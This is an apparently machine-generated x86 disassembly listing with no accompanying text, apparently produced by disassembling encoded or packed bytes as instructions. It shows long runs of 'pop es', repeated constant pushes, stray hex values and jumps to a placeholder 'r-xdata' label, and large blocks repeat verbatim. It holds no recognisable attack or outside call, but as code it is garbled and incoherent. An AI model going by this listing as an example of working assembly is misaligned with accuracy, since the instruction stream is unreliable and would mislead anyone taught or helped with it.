xchg edi eax
jle r-xdata
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
retn 0x7b1c
dec esi
push 0x7070768
pop es
sbb al 0xcf
mov bl 0x1c
out 0xb7 eax
sbb al 0xd7
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
inc edi
push 0x7f070768
scasb [ edi ]
push 0x367e6868
test [ edi + 0x7ec00797 ] dl
div [ eax + ebp * 2 + 0x68 ]
pop esi
push esp
pop es
pop es
push 0xfd7ef3c7
ja r-xdata
dec ebx
push 0x7070768
pop es
sbb al 0xc2
fwait
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
sbb al 0x5f
jg r-xdata
push 0x6fd21e07
push 0x5712c3c0
jle r-xdata
pop es
push ebx
push 0x7070768
pop es
pop es
pop es
cwde
and [ esi + 0x687de97e ] al
push 0x6e127ec2
push 0x35507e68
push 0x680768
seta [ edi + 0x47387e97 ]
push 0x7070768
pop es
pop es
pop es
pop es
push ds
retn 0x1c6f
mov bh 0x1c
xlat
imul ebp [ eax + 0x68 ] 0x7e
popfd
push 0x68
push 0xd250f107
outsb
push 0x71ca7e47
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc al 0x53
fwait
sub ebp [ eax + 0x68 ]
sbb dl [ edx ]
and ebp [ edi + 0x68 ]
push 0x5c2b7ec7
push 0x7b1c0768
sbb al 0xd2
lahf
push ss
jpo r-xdata
push 0x7070707
sub_4912b2
inc esp
push 0x9b531468
sar [ esi - 0x19 ] 0x29
push 0x7070768
jg r-xdata
sbb al 0xd2
lahf
push ss
jpo r-xdata
inc esi
push 0x547ff68
adc al al
jle r-xdata
push 0x7070707
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
jb r-xdata
dec ebx
push 0x7070768
pop es
sbb al 0xc2
fwait
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
sbb al 0x5f
jg r-xdata
xchg esi eax
jle r-xdata
push 0x7070707
pop es
int1
push ds
retn 0x1c75
pop es
push ebx
push 0x7070768
pop es
pop es
pop es
cwde
and [ esi + 0x687de97e ] al
push 0x6e127ec2
push 0x35507e68
push 0x680768
seta [ edi + 0x47387e97 ]
push 0x7070768
pop es
pop es
pop es
pop es
push ds
retn 0x1c6f
mov bh 0x1c
xlat
imul ebp [ eax + 0x68 ] 0x7e
popfd
push 0x68
push 0xd250f107
outsb
push 0x71ca7e47
push 0x7070768
pop es
int1
push ds
0x1c63
xchg esp eax
xchg edi eax
xchg edi eax
pop es
adc dl [ edi + 0x7e ]
iretd
sub_49130d
shr [ ebx + 0x1e ] cl
shl [ ebx + 0x7e ] cl
salc
dec esi
push 0x68070768
ror [ edi + 0x6ed17ec0 ] 0x68
push 0x7070707
les edi [ esi - 0x48 ]
fwait
xchg edi eax
xchg edi eax
pop es
popfd
xchg edi eax
xchg edi eax
jle r-xdata
cmc
sbb al 0x5f
int1
push ds
fisubr [ ebx + 0x7e ]
cmp [ edx + 0x68 ] 0x68
pop es
pop es
pop es
pop es
pop es
push 0x177e93c1
xor [ eax + 0x68 ] ebp
pop es
jle r-xdata
jb r-xdata
arpl [ eax + ecx * 2 ] bx
int1
push ds
0x1c61
cmp [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
xchg esi eax
jle r-xdata
push 0x7070707
pop es
int1
push ds
retn 0x1c75
std
loop r-xdata
or [ eax + 0x68 ] ebp
pop es
pop es
mov al 0x1c
outsd
jle r-xdata
int1
push ds
0x1c63
xchg esp eax
xchg edi eax
xchg edi eax
pop es
adc dl [ edi + 0x7e ]
iretd
push 0x97fd0707
jle r-xdata
int1
push ds
0xfd65
0xfd67
arpl [ eax + 0x68 ] bp
pop es
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
xchg ebp eax
xchg edi eax
xchg edi eax
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
jg r-xdata
pop es
jle r-xdata
or al 0x68
pop es
pop es
pop es
jg r-xdata
cwde
xchg edi eax
xchg edi eax
adc al 0x6f
sub_49134a
dec esp
inc eax
push 0x1ef10768
fisubr [ ebp - 0x3 ]
arpl [ eax + ecx * 2 ] bx
int1
push ds
0x1c61
cmp [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
std
loop r-xdata
or [ eax + 0x68 ] ebp
pop es
pop es
mov al 0x1c
outsd
jle r-xdata
push 0x97fd0707
jle r-xdata
int1
push ds
0xfd65
0xfd67
arpl [ eax + 0x68 ] bp
pop es
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
xchg ebp eax
xchg edi eax
xchg edi eax
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
jg r-xdata
pop es
jle r-xdata
or al 0x68
pop es
pop es
pop es
jg r-xdata
cwde
xchg edi eax
xchg edi eax
adc al 0x6f
dec esi
push 0x68070768
ror [ edi + 0x6ed17ec0 ] 0x68
push 0x7070707
les edi [ esi - 0x48 ]
fwait
xchg edi eax
xchg edi eax
pop es
popfd
xchg edi eax
xchg edi eax
jle r-xdata
int1
push ds
0x1c63
xchg esp eax
xchg edi eax
xchg edi eax
pop es
adc dl [ edi + 0x7e ]
iretd
cmc
sbb al 0x5f
int1
push ds
fisubr [ ebx + 0x7e ]
cmp [ edx + 0x68 ] 0x68
pop es
pop es
pop es
pop es
pop es
push 0x177e93c1
xor [ eax + 0x68 ] ebp
pop es
jle r-xdata
jb r-xdata
xchg esi eax
jle r-xdata
push 0x7070707
pop es
int1
push ds
retn 0x1c75
sub_4913ae
push 0xcc7ed507
jl r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
int1
lodsb [ esi ]
rcl [ ecx + 0x683bd17e ] 0x1
push 0x7070707
pop es
rcr [ edi ] 0x7e
retn
push 0x7070707
pop es
pop es
int1
push ds
0xfd67
sub_49143a
pushad
push 0x769d7f68
push 0x64237e68
push 0x9f7b1668
jle r-xdata
aas
push 0x667e0768
xchg [ edi - 0x2f8f869 ] edx
push 0x6824367e
push 0x68689f7e
push 0x7070707
push 0x7070768
pop es
rol ah 0x68
add [ edi ] edx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
0x7079797 0x707
cwde
adc eax [ edi + 0x1a979797 ]
adc esi [ ebx - 0x68686af1 ]
retn
inc edx
push 0x41139868
jns r-xdata
xchg edi eax
xchg edi eax
sbb dl [ ebx ]
mov bl 0xf
push 0x68
push 0x54ce0707
jle r-xdata
push 0xa47ad21e
dec esp
jle r-xdata
push 0x6861947e
jpo r-xdata
jge r-xdata
pop es
pop es
jle r-xdata
pop es
pop es
pop es
push ebp
push 0xc4070768
xchg ebp eax
xchg edi eax
xchg edi eax
xchg ebp eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0x967ec407
xchg esp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7e49
push 0x7070707
pop es
pop es
sar [ esi + 0x14 ] 0x4e
push 0x7070768
pop es
pop es
pop es
pop es
int1
lodsb [ esi ]
rcl [ ecx + 0x683bd17e ] 0x1
push 0x7070707
pop es
rcr [ edi ] 0x7e
sub_49157b
sub ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc1
sub_491592
dec esp
jle r-xdata
push esi
lahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push ds
fisubr [ edi + 0x1e ]
retn 0x7e63
adc al 0x53
fwait
scasb [ edi ]

jne r-xdata
sbb al 0x51
jg r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
xchg [ edi + 0x7070797 ] edx
leave
jle r-xdata
0x53149797 0x7e87
loopne r-xdata
pop es
jle r-xdata
cmp ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x1cc1
push 0x7070768
pop es
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
cwde
adc ch [ eax ]
pop esi
push 0x736f7e68
push 0x6fd2ae68
jle r-xdata
push ebx
push 0x7070768
std
mov ecx 0x63da1ef1
jle r-xdata
sbb al 0x6f
jle r-xdata
adc [ edi - 0x32f8f869 ] 0xfffffff1
pop es
pop es
pop es
push 0x7070768
pop es
pop es
push ds
retn 0xf109
pop es
push 0x7ad21e68
movsb [ edi ] [ esi ]
int 0xf1
jge r-xdata
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push ebp
push 0xc4070768
push 0x7070707
pop es
retn 0x7b1c
enter 0xccc9 0x7e
neg [ ebx + 0x68 ]
push 0xea1ef107
jg r-xdata
push 0x561c0707
retn
inc edx
push 0x41139868
jns r-xdata
dec esp
jle r-xdata
push 0xa47ad21e
push 0x6861947e
push 0x967ec407
xchg esp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7e49
sub_4915ac
push 0x7e4ca407
cld
push 0x7070768
pop es
pop es
sbb al 0xe7
stosd [ edi ]
xchg esp eax
jle r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
lodsb [ esi ]
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
jle r-xdata
pushad
stc
push ebx
push 0x9b531468
scasb [ edi ]

or eax 0x7076868
cwde
and [ ebp - 0x68788082 ] dl
les ebx [ edx ]
sar [ ebx - 0x39 ] cl
push 0x7070768
pop es
pop es
pop es
sar ch 0x93
jle r-xdata
push esi
push 0xd79f1d68
jle r-xdata
loop r-xdata
push cs
push 0x7e070768
sub eax 0x797979e
shl [ eax + 0x7e ] 0x21
adc [ edi + 0x1a070797 ] 0xffffffd2
inc edi
dec esi
push 0x680768
aas
xchg edi eax
xchg edi eax
xchg edi eax
lodsb [ esi ]
push esp
jle r-xdata
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
push 0x7ec07be2
cli
push eax
push 0x7070768
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
xchg esp eax
xor [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg edi eax
jle r-xdata
xchg edi eax
xchg edi eax
pop ecx
push 0xff070768
jg r-xdata
push 0x5a7e7f68
push 0x64f2ff68
xor [ eax + 0x68 ] ebp
sbb dl dl
jpo r-xdata
or ebp [ eax + 0x68 ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
les edi [ esi - 0x7c ]
xchg edi eax
xchg edi eax
sbb al 0x51
jg r-xdata
xchg edi eax
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
pop es
scasb [ edi ]
0x7e6b
adc [ edi + 0x5ecc0797 ] 0x54
pop es
pop es
pop es
pop es
cwde
and [ ebp - 0x44 ] ebp
push eax
jle r-xdata
push 0xeb140707
mov bl 0x87
cmp [ esi + 0x24 ] 0xffffff94
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
jbe r-xdata
cwde
adc esp [ eax + eax ]
push 0x2f1f7e68
push 0x7070768
pop es
adc al 0x68
xchg esi eax
jle r-xdata
insd
push 0x3cbc7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi - 0x68 ]
arpl [ esi - 0x2b ] di
dec edi
push 0x7070768
cwde
adc edi [ edi - 0x5b68687b ]
push 0xa3b3ebae
jle r-xdata
shl [ ebx + 0x7e ] cl
dec ebp
dec edx
push 0x7070768
pop ebx
push 0xb3931e68
sbb al 0x93
pop es
pop es
pop es
sbb dl dl
arpl [ esi + 0x4d ] di
pop esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb dl [ edx ]
push ebx
imul ebp [ eax + 0x68 ] 0x7e
mov dl 0x46
push 0x6e14f168

pop es
sar [ esi - 0x80 ] 0x5e
push 0x7070768
pop es
pop es
pop es
pop es
push 0x6853597e
push 0x6fd21ef1
jle r-xdata
push ss
push eax
pop ebp
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
jle r-xdata
int1
push ds
sbb [ ecx + 0x682ed57e ] 0x68
pop es
pop es
pop es
daa
push 0x7070768
mov dh 0xcb
mov bl 0x87
sbb dl bl
mov bl 0x87
jle r-xdata
out dx eax
or [ eax + 0x68 ] ebp
pop es
pop es
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x257ec4c7
inc esi
push 0x7070768
jg r-xdata
mov bl 0x7e
cld
imul ebp [ eax + 0x68 ] 0xffffff98
adc ebx esp
ja r-xdata
push ds
xchg ebx eax
mov bl 0x1c
xchg ebx eax
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb ch dl
das
jle r-xdata
sub al 0x68
adc edx [ esi + 0x1a686820 ]
rcl [ ecx + 0x680be47e ] 0x68
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf175
cwde
jle r-xdata
push 0xb7e81468
xchg esi eax
push 0x17016807
xchg edi eax
push 0x827e57a4
jo r-xdata
push 0x7f070707
xor ch [ eax + ebp * 2 ]
push 0x99831ef1
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
push 0xd7ee3c0
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
cwde
adc esi esi
jle r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
push ds
shl [ ebx + 0x7dc07e87 ] cl
push 0xd21c0768
outsd
jle r-xdata
and ch [ eax + 0x68 ]
pop es
adc dl [ edi + 0x7e ]
sbb [ edi - 0xef86869 ] bl
push ds
sar [ ebp - 0x31 ] cl
pop es
push 0x97972f01
xchg edi eax
adc dl [ edi - 0x68 ]
push 0x7070768
pop es
pop es
pop es
les edi [ esi + 0x40 ]
inc esp
push 0x7f070768
outsd
push 0x83b3eb14
xchg esi eax
cwde
adc eax ecx
jle r-xdata
lds edi [ esi + 0xd ]
push 0x7070707
jle r-xdata
pop ds
arpl [ eax + 0x68 ] bp
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x50
jg r-xdata
jg r-xdata
jle r-xdata
push 0x96b7e814
push 0x8885daff
push eax
push 0x631f7e68
push 0x97eb7f68
std
xchg esi eax
xchg edi eax
xchg edi eax
pop es
cwde
adc bl [ edi + 0x1 ]
push 0x542f7e68
push 0xf1691c68
push ds
0xf16c1c29 0xea1e
jle r-xdata
xchg edi eax
xchg edi eax
into
jle r-xdata
xchg edi eax
0x7e21
pop ebp
push 0x85daff68
mov ch al
jle r-xdata
dec eax
push 0x29070768
mov ebx 0x7e979795
push esi
inc esp
push 0xfafd0768
enter 0x1ef1 0xea
jge r-xdata
jl r-xdata
pop eax
push 0x7070768
pop es
0x7efffd7d 0x3b8
out dx eax
sbb al 0x5f
jle r-xdata
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
pushfd
xchg edi eax
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jl r-xdata
mov esp 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
lodsb [ esi ]
pop eax
cwde
adc esp [ ecx + 0x4 ]
push 0xe3d92868
xchg edi eax
xchg edi eax
jle r-xdata
fwait
fisub [ edx + 0x68 ]
push 0x9a3e7f07
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc bl [ edx + 0x7f979797 ]
sbb [ ecx + 0x68 ] ah
push 0x13985712
cmp eax 0x7e68687a
retn
push 0x7e070707
push 0x79
push 0xd21c0768
imul edi [ esi - 0x64 ] 0xffffff92
xchg edi eax
xchg edi eax
les edi [ esi + 0x44 ]
cmp al 0x68
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97976f00
xchg edi eax
adc dl [ edi + 0x7e ]
cmp cl [ eax + ebp * 2 + 0x68 ]
push 0x60979797
outsb
rol ch 0x68
jecxz r-xdata
insd
push 0x7070768
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
push 0x97972f01
xchg edi eax
jle r-xdata
add al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
push 0x25ba7ecd
push 0x7070768
pop es
pop es
pop es
sbb al 0xd2
lahf
jg r-xdata
add eax 0x5ece6868
push esp
pop es
jle r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
push 0xf1cd0707
push ds
retn 0x1caf
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7070707
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al [ edx ]
insb
push 0x57847f68
push 0x51807e68
push 0x5ecc0768
push esp
pop es
salc
sbb eax 0x32c27e86
push 0xc7070768
push 0x97977b00
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
xchg esi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
jg r-xdata
daa
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
das
push 0x60977e68
push 0x7e7e0768
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0xb17e 0x3b
push 0x399e7f68
push 0x69577e68
push 0x7070768
xchg esp eax
ficomp [ edi - 0x6b9028e4 ]
shr [ ebx + 0x7e ] cl
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp ebp
dec edx
push 0x9b667e68
inc esi
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6f
push 0x7e560298
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
std
out dx eax
int1
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
pop es
pop es
pop es
std
lahf
xchg edi eax
xchg edi eax
jle r-xdata
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x9787c87e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7f6b
push esp
push 0x7070768
pop es
sub_491643
push 0xe2684be2
jpo r-xdata
push 0x68070707
and [ ebx - 0x69 ] dl
xchg edi eax
xchg edi eax
jg r-xdata
jle r-xdata
pop es
pop es
sbb dl dl
push 0xc57e6868
push cs
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
lodsb [ esi ]
jle r-xdata
push 0x7ec07be2
cli
push eax
push 0x7070768
int1
push ds
sar [ ebx - 0x31 ] cl
jle r-xdata
jle r-xdata
inc edi
pushad
push 0x5a7e7f68
push 0x64f2ff68
xor [ eax + 0x68 ] ebp
stc
push ebx
push 0x9b531468
scasb [ edi ]

or eax 0x7076868
cwde
and [ ebp - 0x68788082 ] dl
les ebx [ edx ]
sar [ ebx - 0x39 ] cl
push 0x7070768
pop es
pop es
pop es
sar ch 0x93
jle r-xdata
push esi
push 0xd79f1d68
jle r-xdata
loop r-xdata
push cs
push 0x7e070768
sub eax 0x797979e
shl [ eax + 0x7e ] 0x21
adc [ edi + 0x1a070797 ] 0xffffffd2
dec esi
push 0x680768
aas
xchg edi eax
xchg edi eax
xchg edi eax
lodsb [ esi ]
push esp
jle r-xdata
jle r-xdata
sahf
xchg edi eax
xchg edi eax
pop es
xchg esp eax
xor [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg edi eax
jle r-xdata
xchg edi eax
xchg edi eax
pop ecx
push 0xff070768
jg r-xdata
sbb dl dl
jpo r-xdata
or ebp [ eax + 0x68 ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
les edi [ esi - 0x7c ]
xchg edi eax
xchg edi eax
sbb al 0x51
jg r-xdata
xchg edi eax
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
pop es
scasb [ edi ]
0x7e6b
adc [ edi + 0x5ecc0797 ] 0x54
pop es
pop es
pop es
pop es
cwde
and [ ebp - 0x44 ] ebp
push eax
jle r-xdata
push 0xeb140707
mov bl 0x87
cmp [ esi + 0x24 ] 0xffffff94
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg r-xdata
jbe r-xdata
cwde
adc esp [ eax + eax ]
push 0x2f1f7e68
push 0x7070768
pop es
adc al 0x68
xchg esi eax
jle r-xdata
insd
push 0x3cbc7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi - 0x68 ]
arpl [ esi - 0x2b ] di
dec edi
push 0x7070768
cwde
adc edi [ edi - 0x5b68687b ]
push 0xa3b3ebae
jle r-xdata
shl [ ebx + 0x7e ] cl
dec ebp
dec edx
push 0x7070768
pop ebx
push 0xb3931e68
sbb al 0x93
pop es
pop es
pop es
sbb dl dl
arpl [ esi + 0x4d ] di
pop esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb dl [ edx ]
push ebx
imul ebp [ eax + 0x68 ] 0x7e
mov dl 0x46
push 0x6e14f168

pop es
sar [ esi - 0x80 ] 0x5e
push 0x7070768
pop es
pop es
pop es
pop es
push 0x6853597e
push 0x6fd21ef1
jle r-xdata
push ss
push eax
pop ebp
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
jle r-xdata
int1
push ds
sbb [ ecx + 0x682ed57e ] 0x68
pop es
pop es
pop es
daa
push 0x7070768
mov dh 0xcb
mov bl 0x87
sbb dl bl
mov bl 0x87
jle r-xdata
out dx eax
or [ eax + 0x68 ] ebp
pop es
pop es
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x257ec4c7
inc esi
push 0x7070768
jg r-xdata
mov bl 0x7e
cld
imul ebp [ eax + 0x68 ] 0xffffff98
adc ebx esp
ja r-xdata
push ds
xchg ebx eax
mov bl 0x1c
xchg ebx eax
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb ch dl
das
jle r-xdata
sub al 0x68
adc edx [ esi + 0x1a686820 ]
rcl [ ecx + 0x680be47e ] 0x68
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf175
cwde
jle r-xdata
push 0xb7e81468
xchg esi eax
push 0x17016807
xchg edi eax
push 0x827e57a4
jo r-xdata
push 0x7f070707
xor ch [ eax + ebp * 2 ]
push 0x99831ef1
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
push 0xd7ee3c0
xchg [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
cwde
adc esi esi
jle r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
push ds
shl [ ebx + 0x7dc07e87 ] cl
push 0xd21c0768
outsd
jle r-xdata
and ch [ eax + 0x68 ]
pop es
adc dl [ edi + 0x7e ]
sbb [ edi - 0xef86869 ] bl
push ds
sar [ ebp - 0x31 ] cl
pop es
push 0x97972f01
xchg edi eax
adc dl [ edi - 0x68 ]
push 0x7070768
pop es
pop es
pop es
les edi [ esi + 0x40 ]
inc esp
push 0x7f070768
outsd
push 0x83b3eb14
xchg esi eax
cwde
adc eax ecx
jle r-xdata
lds edi [ esi + 0xd ]
push 0x7070707
jle r-xdata
pop ds
arpl [ eax + 0x68 ] bp
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb al 0x50
jg r-xdata
jg r-xdata
jle r-xdata
push 0x96b7e814
push 0x8885daff
push eax
push 0x631f7e68
push 0x97eb7f68
std
xchg esi eax
xchg edi eax
xchg edi eax
pop es
cwde
adc bl [ edi + 0x1 ]
push 0x542f7e68
push 0xf1691c68
push ds
0xf16c1c29 0xea1e
jle r-xdata
xchg edi eax
xchg edi eax
into
jle r-xdata
xchg edi eax
0x7e21
pop ebp
push 0x85daff68
mov ch al
jle r-xdata
dec eax
push 0x29070768
mov ebx 0x7e979795
push esi
inc esp
push 0xfafd0768
enter 0x1ef1 0xea
jge r-xdata
jl r-xdata
pop eax
push 0x7070768
pop es
0x7efffd7d 0x3b8
out dx eax
sbb al 0x5f
jle r-xdata
enter 0x979c 0x97
pop es
pop es
pop es
pop es
int1
push ds
0x3edf7e21 0x6868
pushfd
xchg edi eax
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jl r-xdata
mov esp 0x797979e
pop es
scasb [ edi ]
jmp r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
int1
lodsb [ esi ]
pop eax
cwde
adc esp [ ecx + 0x4 ]
push 0xe3d92868
xchg edi eax
xchg edi eax
jle r-xdata
fwait
fisub [ edx + 0x68 ]
push 0x9a3e7f07
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc bl [ edx + 0x7f979797 ]
sbb [ ecx + 0x68 ] ah
push 0x13985712
cmp eax 0x7e68687a
retn
push 0x7e070707
push 0x79
push 0xd21c0768
imul edi [ esi - 0x64 ] 0xffffff92
xchg edi eax
xchg edi eax
les edi [ esi + 0x44 ]
cmp al 0x68
sub ebp [ cs : eax + 0x68 ]
pop es
pop es
pop es
push ds
shr [ ebx + 0x7e ] cl
outsd
pushad
push 0xdbc06868
adc dl [ edi - 0x68 ]
adc esi [ edx + 0x5c ]
push 0xceb5fd68
std
mov dl 0x7e
xchg esi eax
pop esp
push 0xca1ef168
and [ esi + 0x1b ] edi
push 0x7070768
pop es
pop es
push 0x7a7edfc1
jpe r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97976f00
xchg edi eax
adc dl [ edi + 0x7e ]
cmp cl [ eax + ebp * 2 + 0x68 ]
push 0x60979797
outsb
rol ch 0x68
jecxz r-xdata
insd
push 0x7070768
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
push 0x97972f01
xchg edi eax
jle r-xdata
add al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
jle r-xdata
push 0x25ba7ecd
push 0x7070768
pop es
pop es
pop es
sbb al 0xd2
lahf
jg r-xdata
add eax 0x5ece6868
push esp
pop es
jle r-xdata
push 0x7e8fb3e3
push ds
xor al 0x68
push 0xa3d11e07
push [ 0x7e7cf631 ]
push 0xf1cd0707
push ds
retn 0x1caf
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
push 0x7070707
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al [ edx ]
insb
push 0x57847f68
push 0x51807e68
push 0x5ecc0768
push esp
pop es
salc
sbb eax 0x32c27e86
push 0xc7070768
push 0x97977b00
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
xchg esi eax
imul ebp [ eax + 0x68 ] 0x7
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
jg r-xdata
daa
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
das
push 0x60977e68
push 0x7e7e0768
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
enter 0xb17e 0x3b
push 0x399e7f68
push 0x69577e68
push 0x7070768
xchg esp eax
ficomp [ edi - 0x6b9028e4 ]
shr [ ebx + 0x7e ] cl
leave
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp ebp
dec edx
push 0x9b667e68
inc esi
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x6f
push 0x7e560298
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
std
out dx eax
int1
push ds
shl [ ecx + 0x7e ] cl
add al 0x2a
push 0x7070768
pop es
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
fild [ ebx ]
push 0x6be26868
sar [ esi + 0x17 ] 0x32
push 0x7070768
pop es
pop es
pop es
std
lahf
xchg edi eax
xchg edi eax
jle r-xdata
pop es
sbb dl [ edx ]
inc edi
push 0x68
push 0x9787c87e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
0x7f6b
push esp
push 0x7070768
pop es
sub_491749
push ds
rol [ ecx - 0xf ] cl
push ds
fisub [ ebx + 0x7e ]
aad 0x4f
push 0x7070768
cwde
adc edi [ edi - 0x5b68687b ]
push 0xa3b3ebae
jle r-xdata
pop es
pop es
